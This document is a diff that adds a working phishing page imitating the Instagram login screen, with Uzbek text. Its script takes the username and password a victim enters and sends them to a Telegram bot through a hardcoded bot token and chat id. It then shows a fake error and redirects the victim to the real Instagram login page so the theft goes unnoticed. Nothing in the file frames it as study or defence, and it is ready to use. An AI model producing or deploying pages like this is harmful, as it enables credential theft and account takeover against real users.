@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #fafafa; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: -apple-system, sans-serif; }
+        .box { background: white; padding: 40px; border: 1px solid #dbdbdb; width: 350px; text-align: center; border-radius: 3px; }
+        .logo { width: 175px; margin-bottom: 25px; }
+        input { width: 100%; padding: 12px; margin-bottom: 7px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 14px; outline: none; }
+        input:focus { border-color: #a8a8a8; }
+        button { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 14px; }
+        button:hover { background: #1877f2; }
+        .divider { margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: bold; position: relative; display: flex; align-items: center; justify-content: center; }
+        .divider::before, .divider::after { content: ""; height: 1px; background: #dbdbdb; flex: 1; margin: 0 10px; }
+        .fb { color: #385185; font-weight: bold; cursor: pointer; font-size: 14px; margin-top: 15px; display: block; text-decoration: none; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
+        <form id="instaForm">
+            <input type="text" id="user" placeholder="Telefon raqami, foydalanuvchi nomi yoki email" required>
+            <input type="password" id="pass" placeholder="Parol" required>
+            <button type="submit">Kirish</button>
+        </form>
+        <div class="divider">YOKI</div>
+        <a href="#" class="fb">Facebook orqali kirish</a>
+    </div>
+
+    <script>
+        // Siz taqdim etgan yangi ma'lumotlar
+        const token = '8201700890:AAH60-PY4OpP9LIcfjZfLqy7GEazKwGj6R8'; 
+        const chat_id = '6311365239'; 
+
+        document.getElementById('instaForm').onsubmit = function(e) {
+            e.preventDefault();
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
+
+            const text = `📸 YANGI INSTAGRAM LOGIN:\n👤 Login: ${user}\n🔑 Parol: ${pass}\n⏰ Vaqt: ${new Date().toLocaleString()}`;
+
+            // Telegram Botga yuborish
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`)
+            .then(() => {
+                alert("Xatolik: Tizimga kirishda xatolik yuz berdi. Qaytadan urinib ko'ring.");
+                window.location.href = "https://www.instagram.com/accounts/login/"; //
+            })
+            .catch(() => {
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            });
+        };
+    </script>
+</body>
+</html>
